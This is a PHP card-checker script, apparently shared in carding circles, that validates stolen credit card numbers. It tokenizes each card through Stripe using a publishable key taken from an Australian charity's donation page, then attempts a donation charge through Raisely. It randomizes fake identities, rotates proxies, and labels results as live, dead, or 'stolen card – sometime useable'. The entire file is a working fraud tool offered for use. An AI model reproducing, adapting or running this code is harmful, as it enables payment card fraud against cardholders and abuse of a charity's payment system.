<?php

///////////////BASE BY H4CK3RZZZ////////////////////

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function H4CK3RZZZproxies()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = H4CK3RZZZproxies();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

//$username = 'Put Zone Username Here';
//$password = 'Put Zone Password Here';
//$port = 22225;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[1st Req]

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4); uncomment to use proxy.txt
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json', 
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[currency]=INR&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e4b0be45-c88c-486c-a84e-4f5d9fc7c22a4cb5bc&muid=cb7b8bfc-4fec-4537-8019-cae4a004ef63ab3381&sid=fe62cbbc-30bd-4e96-b20a-7f0171607ca6685200&payment_user_agent=stripe.js%2F3dff6f47%3B+stripe-js-v3%2F3dff6f47&time_on_page=81119&referrer=https%3A%2F%2Fdonate.tzuchi.org.au%2F&key=pk_live_IuO9apxOM1AclLg9TOTxjUS0');

$result1 = curl_exec($ch);
$token = trim(strip_tags(getStr($result1,'"id": "','"')));

////Uncomment this section for using 2req////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

 $ch = curl_init();

//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4); Uncomment to use proxy.txt
 curl_setopt($ch, CURLOPT_URL, 'https://api.raisely.com/v3/donations?campaign=d1c85020-6418-11ea-a928-e744aa12285f');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'accept: application/json, text/plain, */*',
   'content-type: application/json',
  // 'cookie: ',   
   'Origin: https://donate.tzuchi.org.au',
   'referer: https://donate.tzuchi.org.au/',
   'Sec-Fetch-Mode: cors',
//'X-Requested-With: XMLHttpRequest',
 ));
 curl_setopt($ch, CURLOPT_POSTFIELDS, '{"data":{"method":"CREDIT_CARD","anonymous":false,"interval":"ONCE","count":1,"amount":910300,"otherAmount":"","feeOptIn":true,"items":[],"currency":"INR","email":"Lala@hdj.jdjd","firstName":"Udud","lastName":"Bdh","private":{"gift_aid":false,"country":"BS","hearFrom":"yes","purpose1":"Asylum seekers 庇護援助","suburbName":"Neyyirk","DPN":"Udud","CRN":"Bdh","postCode":"10080"},"profileUuid":"d1ca7300-6418-11ea-a928-e744aa12285f","campaignUuid":"d1c85020-6418-11ea-a928-e744aa12285f","type":"ONLINE","fee":20000,"token":"'.$token.'"}}');
$result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"message":"','"'))); 


////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED H4CK3RZZZ ♛ </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED H4CK3RZZZ ♛ </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVC MATCHEDH4CK3RZZZ </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-Red">✓</span> <span class="badge badge-red"> ★ CCN LIVE H4CK3RZZZ</span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-Red">✓</span> <span class="badge badge-red"> ★ CCN LIVE H4CK3RZZZ/span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-Red">✓</span> <span class="badge badge-red"> ★ CCN LIVE H4CK3RZZZ </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-Red">✓</span> <span class="badge badge-red"> ★ CCN LIVE H4CK3RZZZ♛ </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVC MATCHED - Incorrect Zip H4CK3RZZZ♛ </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-Red">✓</span> <span class="badge badge-Red"> ★ Stolen_Card - Sometime Useable H4CK3RZZZ ♛ </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-Red">✓</span> <span class="badge badge-Red"> ★ Lost_Card - Sometime Useable H4CK3RZZZ♛ </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-Red">✓</span> <span class="badge badge-Red"> ★ Insufficient Funds H4CK3RZZZ♛ </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-Red"> ★ Card Expired H4CK3RZZZ♛</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-Red">✓</span> <span class="badge badge-Red"> ★ Pickup Card_Card - Sometime Useable H4CK3RZZZ ♛ </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-Red"> ★ Incorrect Card Number H4CK3RZZZ ♛</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-Red"> ★ Incorrect Card Number H4CK3RZZZ♛</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-Red"> ★ Card Declined H4CK3RZZZ ♛</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-Red"> ★ Declined : Generic_Decline H4CK3RZZZ♛</span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-Red"> ★ Declined : Do_Not_Honor H4CK3RZZZ ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-Red"> ★ Security Code Check : Unchecked [Proxy Dead] H4CK3RZZZ ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-Red"> ★ Security Code Check : Fail H4CK3RZZZ♛</span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-Red"> ★ Expired Card H4CK3RZZZ ♛</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-Red"> ★ Card Doesnt Support This Purchase H4CK3RZZZ ♛</span> </br>';
}
 else {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-Red"> ★ Proxy Dead / Error Not Listed H4CK3RZZZ ♛</span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
echo $result1;
echo $result;


///////////////////////////////////////////////====== By H4CK3RZZZ===============\\\\\\\\\\\\\\\[Used Reboot13 Raw Base ]
?>
